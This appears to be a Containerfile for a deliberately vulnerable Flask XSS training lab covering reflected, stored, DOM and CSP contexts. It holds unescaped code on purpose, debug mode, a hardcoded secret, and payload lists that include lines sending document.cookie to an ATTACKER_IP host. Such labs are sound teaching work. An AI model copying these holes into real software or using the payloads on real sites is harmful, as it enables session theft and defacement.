# xss.Containerfile
# XSS lab with multiple reflection contexts, stored XSS, DOM XSS, and CSP challenges
#
# Build:  podman build -t xss -f xss.Containerfile .
# Run:    podman run -d -p 5000:5000 xss
#
# WARNING: This container is intentionally vulnerable. Run it only on an isolated
# host or lab network. Never expose it to the internet or a production network.
#
# Endpoints:
#   GET  /search?q=             Reflected XSS — HTML context
#   GET  /profile?name=          Reflected XSS — Attribute context
#   GET  /greet?name=            Reflected XSS — JavaScript context
#   GET  /theme?color=           Reflected XSS — CSS context
#   GET  /redirect?url=          Reflected XSS — URL context
#   GET|POST /comments           Stored XSS — Comment system
#   GET|POST /profile/edit       Stored XSS — User profile JS context
#   GET  /dom?data=             DOM-based XSS — innerHTML
#   GET  /dom2?data=            DOM-based XSS — document.write
#   GET  /csp/search?q=         CSP-protected page (compare to /search)
#   GET  /admin/panel            Admin panel (target for stored XSS)

FROM docker.io/library/python:3-slim

RUN pip install flask

WORKDIR /app

COPY <<'APPEOF' /app/app.py
import os
import json
from flask import Flask, request, render_template_string, make_response, session, redirect

app = Flask(__name__)
app.secret_key = 'supersecretkey123'

HTML_HEAD = '''
<!DOCTYPE html>
<html><head><title>XSS Lab</title>
<style>body{font-family:monospace;max-width:900px;margin:20px auto;padding:20px;background:#111;color:#0f0}
pre,code{background:#222;padding:10px;display:block;overflow-x:auto}
.hint{color:#ff0}.error{color:#f00}.success{color:#0f0}
h2{border-bottom:1px solid #333;padding-bottom:5px;margin-top:25px}
form{margin:10px 0}textarea,input[type=text],input[type=url]{width:70%;background:#222;color:#0f0;border:1px solid #0a0;padding:5px}
input[type=submit]{background:#0a0;color:#000;border:none;padding:6px 18px;cursor:pointer}
a{color:#0af}
.comment{border:1px solid #333;padding:8px;margin:5px 0;background:#1a1a1a}
.nav a{padding:5px 10px;margin:0 5px;background:#222;text-decoration:none}
</style></head><body>
<h1>XSS Exploitation Lab</h1>
<div class="nav">
  <a href="/">Home</a>
  <a href="/search">Search</a>
  <a href="/profile">Profile</a>
  <a href="/greet">Greet</a>
  <a href="/theme">Theme</a>
  <a href="/redirect">Redirect</a>
  <a href="/comments">Comments</a>
  <a href="/dom">DOM XSS</a>
  <a href="/csp/search">CSP Search</a>
  <a href="/admin/panel">Admin Panel</a>
</div>
'''

HTML_FOOT = '''
<hr>
<h2>XSS Contexts Reference</h2>
<table style="width:100%;border-collapse:collapse">
<tr style="background:#222"><th>Context</th><th>Escaping Technique</th><th>Example Payload</th></tr>
<tr><td>HTML</td><td>Close tag, open new</td><td><code>&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
<tr><td>Attribute</td><td>Close quote, inject event handler</td><td><code>" onmouseover="alert(1)</code></td></tr>
<tr><td>JavaScript</td><td>Close string, inject statement</td><td><code>'; alert(1); //</code></td></tr>
<tr><td>CSS</td><td>Inject url() with javascript:</td><td><code>red}body{background:url(javascript:alert(1))}</code></td></tr>
<tr><td>URL</td><td>javascript: pseudo-protocol</td><td><code>javascript:alert(1)</code></td></tr>
</table>
</body></html>
'''

# In-memory comment store
COMMENTS = [
    {"author": "admin", "text": "Welcome to the XSS lab! Try injecting scripts in the comment box.", "timestamp": "2026-06-26T00:00:00"}
]

# User profile store
USER_PROFILES = {}

# ── Reflected XSS — HTML Context ──────────────────────────────────────
@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = ''
    if query:
        # VULNERABLE: query is reflected directly into HTML without encoding
        results = f'<div>Search results for: {query}</div><p>No results found.</p>'
    return HTML_HEAD + f'''
    <h2>GET /search — Reflected XSS (HTML Context)</h2>
    <p class="hint">VULNERABLE: User input reflected directly inside &lt;div&gt; tags. No encoding.</p>
    <form><input type="text" name="q" placeholder="Search term..." value="{query}">
    <input type="submit" value="Search"></form>
    {results}
    <pre>
# Test payloads:
curl "http://localhost:5000/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;"
curl "http://localhost:5000/search?q=&lt;img src=x onerror=alert(1)&gt;"
curl "http://localhost:5000/search?q=&lt;svg onload=alert(1)&gt;"
curl "http://localhost:5000/search?q=&lt;body onload=alert(1)&gt;"
    </pre>
    ''' + HTML_FOOT


# ── Reflected XSS — Attribute Context ─────────────────────────────────
@app.route('/profile')
def profile():
    name = request.args.get('name', 'Anonymous')
    # VULNERABLE: name reflected inside input value attribute without encoding
    return HTML_HEAD + f'''
    <h2>GET /profile — Reflected XSS (Attribute Context)</h2>
    <p class="hint">VULNERABLE: User input inside <code>value</code> attribute. Escape the attribute to inject.</p>
    <form>
        <label>Name:</label>
        <input type="text" name="name" value="{name}">
        <input type="submit" value="Update">
    </form>
    <p>Current profile name: {name}</p>
    <pre>
# Test payloads (escape the attribute):
curl "http://localhost:5000/profile?name=%22%20onfocus%3D%22alert(1)%22%20autofocus%3D%22"
# Decoded: " onfocus="alert(1)" autofocus="

curl "http://localhost:5000/profile?name=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
# Decoded: "><script>alert(1)</script>

curl "http://localhost:5000/profile?name=%22%20onmouseover%3D%22alert(1)
# Decoded: " onmouseover="alert(1)
    </pre>
    ''' + HTML_FOOT


# ── Reflected XSS — JavaScript Context ────────────────────────────────
@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # VULNERABLE: name is placed inside a JavaScript string
    return HTML_HEAD + f'''
    <h2>GET /greet — Reflected XSS (JavaScript Context)</h2>
    <p class="hint">VULNERABLE: User input inside <code>var name = '...'</code> JavaScript string.</p>
    <form><input type="text" name="name" placeholder="Your name..." value="{name}">
    <input type="submit" value="Greet"></form>
    <p id="greeting"></p>
    <script>
        var username = '{name}';
        document.getElementById('greeting').textContent = 'Hello, ' + username + '!';
    </script>
    <pre>
# Test payloads (break out of the string):
curl "http://localhost:5000/greet?name=%27%3B+alert(1)%3B+%2F%2F"
# Decoded: '; alert(1); //

curl "http://localhost:5000/greet?name=%27-alert(1)-%27"
# Decoded: '-alert(1)-'

curl "http://localhost:5000/greet?name=%27%3B+eval(atob(%27YWxlcnQoMSk%3D%27))%3B+%2F%2F"
# Decoded: '; eval(atob('YWxlcnQoMSk=')); //
    </pre>
    ''' + HTML_FOOT


# ── Reflected XSS — CSS Context ───────────────────────────────────────
@app.route('/theme')
def theme():
    color = request.args.get('color', '#0f0')
    # VULNERABLE: color is placed inside CSS
    return HTML_HEAD + f'''
    <h2>GET /theme — Reflected XSS (CSS Context)</h2>
    <p class="hint">VULNERABLE: User input placed in CSS <code>background</code> property.</p>
    <form><input type="text" name="color" placeholder="#0f0" value="{color}">
    <input type="submit" value="Set Theme"></form>
    <style>
        .theme-demo {{ background: {color}; padding: 20px; }}
    </style>
    <div class="theme-demo">Current theme color</div>
    <pre>
# Test payloads:
/theme?color=url("javascript:alert(1)")
/theme?color=red%7Dbody%7Bbackground:url("javascript:alert(1)")%7D
/theme?color=expression(alert(1))  # Old IE only
    </pre>
    ''' + HTML_FOOT


# ── Reflected XSS — URL Context ───────────────────────────────────────
@app.route('/redirect')
def redirect_page():
    url = request.args.get('url', '/')
    # VULNERABLE: url placed in <a href> without validation
    return HTML_HEAD + f'''
    <h2>GET /redirect — Reflected XSS (URL Context)</h2>
    <p class="hint">VULNERABLE: User input placed in <code>&lt;a href&gt;</code> attribute. Uses javascript: pseudo-protocol.</p>
    <form><input type="text" name="url" placeholder="https://example.com" value="{url}">
    <input type="submit" value="Go"></form>
    <p>Click to continue: <a href="{url}">Continue</a></p>
    <pre>
# Test payloads:
/redirect?url=javascript:alert(1)
/redirect?url=javascript:new Image().src='http://ATTACKER_IP:8888/steal?c='+document.cookie
/redirect?url=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
    </pre>
    ''' + HTML_FOOT


# ── Stored XSS — Comments ─────────────────────────────────────────────
@app.route('/comments', methods=['GET', 'POST'])
def comments():
    if request.method == 'POST':
        author = request.form.get('author', 'anonymous')
        text = request.form.get('text', '')
        if text:
            COMMENTS.append({
                "author": author,
                "text": text,
                "timestamp": "2026-06-26T12:00:00"
            })

    comment_html = ''
    for c in COMMENTS:
        # VULNERABLE: comment text rendered directly without encoding
        comment_html += f'<div class="comment"><strong>{c["author"]}</strong> ({c["timestamp"]})<br>{c["text"]}</div>\n'

    return HTML_HEAD + f'''
    <h2>GET|POST /comments — Stored XSS</h2>
    <p class="hint">VULNERABLE: Comments stored and displayed without HTML encoding. Persistent XSS.</p>
    <p>Every visitor to this page will execute your injected script.</p>
    <form method="POST">
        <label>Author:</label><br>
        <input type="text" name="author" value="attacker"><br><br>
        <label>Comment:</label><br>
        <textarea name="text" rows="3"></textarea><br>
        <input type="submit" value="Post Comment">
    </form>
    <hr>
    <h3>Comments ({len(COMMENTS)})</h3>
    {comment_html}
    <pre>
# Stored XSS payloads:
&lt;script&gt;new Image().src='http://ATTACKER_IP:8888/steal?c='+document.cookie&lt;/script&gt;
&lt;img src=x onerror="fetch('http://ATTACKER_IP:8888/s',{method:'POST',body:document.cookie})"&gt;
&lt;svg onload="document.body.innerHTML='&lt;h1&gt;DEFACED&lt;/h1&gt;'"&gt;
    </pre>
    ''' + HTML_FOOT


# ── Stored XSS — User Profile (JavaScript context) ───────────────────
@app.route('/profile/edit', methods=['GET', 'POST'])
def profile_edit():
    if 'username' not in session:
        session['username'] = 'user_' + os.urandom(4).hex()

    username = session['username']

    if request.method == 'POST':
        bio = request.form.get('bio', '')
        USER_PROFILES[username] = bio

    bio = USER_PROFILES.get(username, 'No bio set.')

    # VULNERABLE: bio is placed inside a JavaScript template literal
    return HTML_HEAD + f'''
    <h2>GET|POST /profile/edit — Stored XSS (JavaScript Context)</h2>
    <p class="hint">VULNERABLE: Bio stored and reflected inside JavaScript template literal. Persistent.</p>
    <p>Your session: {username}</p>
    <form method="POST">
        <label>Bio (rendered in JS):</label><br>
        <textarea name="bio" rows="4">{bio}</textarea><br>
        <input type="submit" value="Save Bio">
    </form>
    <hr>
    <h3>Profile Preview</h3>
    <div id="bio-preview"></div>
    <script>
        var user_bio = `{bio}`;
        document.getElementById('bio-preview').innerHTML =
            '<p>' + user_bio + '</p>';
    </script>
    <pre>
# Stored XSS in JS template literal context:
# Bio payload: ${{alert(1)}}
# Bio payload: ${{document.body.innerHTML='&lt;h1&gt;HACKED&lt;/h1&gt;'}}
    </pre>
    ''' + HTML_FOOT


# ── DOM-based XSS — innerHTML ─────────────────────────────────────────
@app.route('/dom')
def dom_xss():
    """DOM-based XSS via innerHTML."""
    data = request.args.get('data', '')
    # The server returns safe HTML, but client-side JS writes user data to innerHTML
    return HTML_HEAD + f'''
    <h2>GET /dom — DOM-based XSS (innerHTML)</h2>
    <p class="hint">VULNERABLE: JavaScript reads URL parameter and writes to <code>innerHTML</code>. No server reflection.</p>
    <form><input type="text" name="data" placeholder="Injection data..." value="{data}">
    <input type="submit" value="Render"></form>
    <div id="output"></div>
    <script>
        // VULNERABLE: reads from URL fragment/query and writes to innerHTML
        var params = new URLSearchParams(location.search);
        var user_data = params.get('data') || '';
        document.getElementById('output').innerHTML = user_data;
    </script>
    <pre>
# DOM XSS via innerHTML:
/dom?data=&lt;img src=x onerror=alert(1)&gt;
/dom?data=&lt;svg onload=alert(1)&gt;
/dom?data=&lt;img src=x onerror="fetch('http://ATTACKER_IP:8888/s',{{method:'POST',body:document.cookie}})"&gt;
    </pre>
    ''' + HTML_FOOT


# ── DOM-based XSS — document.write ───────────────────────────────────
@app.route('/dom2')
def dom2_xss():
    """DOM-based XSS via document.write."""
    data = request.args.get('data', '')
    return HTML_HEAD + f'''
    <h2>GET /dom2 — DOM-based XSS (document.write)</h2>
    <p class="hint">VULNERABLE: JavaScript writes URL parameter to document via <code>document.write</code>.</p>
    <form><input type="text" name="data" placeholder="Injection data..." value="{data}">
    <input type="submit" value="Write"></form>
    <p>Output below:</p>
    <script>
        var params = new URLSearchParams(location.search);
        document.write(params.get('data') || 'No data provided');
    </script>
    <pre>
/dom2?data=&lt;script&gt;alert(1)&lt;/script&gt;
/dom2?data=&lt;img src=x onerror=alert(1)&gt;
    </pre>
    ''' + HTML_FOOT


# ── CSP-Protected Search ──────────────────────────────────────────────
@app.route('/csp/search')
def csp_search():
    query = request.args.get('q', '')
    results = ''
    if query:
        results = f'<div>Search results for: {query}</div><p>No results found.</p>'

    resp = make_response(HTML_HEAD + f'''
    <h2>GET /csp/search — CSP-Protected Search</h2>
    <p class="success">PROTECTED: Content-Security-Policy blocks inline scripts, only allows same-origin scripts.</p>
    <p class="hint">The <code>&lt;div&gt;</code> reflection still exists, but CSP prevents execution.</p>
    <form><input type="text" name="q" placeholder="Try to inject...">
    <input type="submit" value="Search"></form>
    {results}
    <pre>
# CSP blocks these:
/csp/search?q=&lt;script&gt;alert(1)&lt;/script&gt;     -> Blocked by CSP
/csp/search?q=&lt;img src=x onerror=alert(1)&gt;  -> Blocked by CSP

# Bypass ideas: JSONP endpoints, script gadgets, dangling markup
    </pre>
    ''' + HTML_FOOT)

    resp.headers['Content-Security-Policy'] = \
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:"
    return resp


# ── Admin Panel (Target for Stored XSS) ───────────────────────────────
@app.route('/admin/panel')
def admin_panel():
    """Simulated admin panel with sensitive data — target for cookie theft via stored XSS."""
    return HTML_HEAD + '''
    <h2>Admin Panel</h2>
    <p class="hint">This page simulates an admin panel. If a stored XSS payload steals an admin's cookies, the attacker gains admin access.</p>
    <p>Admin session token: <code>session=eyJhZG1pbiI6dHJ1ZX0.admin_session_abcdef</code></p>
    <hr>
    <h3>Sensitive Data (Visible to Admin Only)</h3>
    <table>
    <tr><td>User emails</td><td>admin@corp.com, ceo@corp.com, dev@corp.com</td></tr>
    <tr><td>API Key</td><td>sk-proj-admin-key-1234567890abcdef</td></tr>
    <tr><td>Database password</td><td>p@ssw0rd_admin_2024!</td></tr>
    <tr><td>Server SSH</td><td>ssh root@10.0.0.5 -p 2222</td></tr>
    </table>
    <hr>
    <p>Comments from users (check for XSS):</p>
    ''' + ''.join(f'<div class="comment"><strong>{c["author"]}</strong>: {c["text"]}</div>' for c in COMMENTS) + '''
    <p><a href="/">Back to Lab</a></p>
    ''' + HTML_FOOT


# ── Root ──────────────────────────────────────────────────────────────
@app.route('/')
def index():
    return HTML_HEAD + '''
    <h2>XSS Lab Overview</h2>
    <p>Each endpoint demonstrates a different XSS context. All are deliberately vulnerable (except /csp/search).</p>
    <p class="hint">Start a listener to receive exfiltrated data:</p>
    <pre>python3 -m http.server 8888</pre>
    <p class="hint">Or use the XSS exfiltration server (<code>xss-steal.py</code>)</p>
    <table>
    <tr style="background:#222"><th>Endpoint</th><th>Type</th><th>Context</th><th>Difficulty</th></tr>
    <tr><td>/search?q=</td><td>Reflected</td><td>HTML body</td><td>Easy</td></tr>
    <tr><td>/profile?name=</td><td>Reflected</td><td>Attribute value</td><td>Easy</td></tr>
    <tr><td>/greet?name=</td><td>Reflected</td><td>JavaScript string</td><td>Medium</td></tr>
    <tr><td>/theme?color=</td><td>Reflected</td><td>CSS</td><td>Medium</td></tr>
    <tr><td>/redirect?url=</td><td>Reflected</td><td>URL href</td><td>Easy</td></tr>
    <tr><td>/comments</td><td>Stored</td><td>HTML body</td><td>Easy</td></tr>
    <tr><td>/profile/edit</td><td>Stored</td><td>JavaScript template</td><td>Medium</td></tr>
    <tr><td>/dom?data=</td><td>DOM-based</td><td>innerHTML</td><td>Easy</td></tr>
    <tr><td>/dom2?data=</td><td>DOM-based</td><td>document.write</td><td>Easy</td></tr>
    <tr><td>/csp/search?q=</td><td>Reflected+CSP</td><td>HTML+CSP</td><td>Hard</td></tr>
    </table>
    <p>Target: <a href="/admin/panel">Admin Panel</a> (steal admin cookies via stored XSS in comments)</p>
    ''' + HTML_FOOT


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
APPEOF

EXPOSE 5000

CMD ["python3", "/app/app.py"]
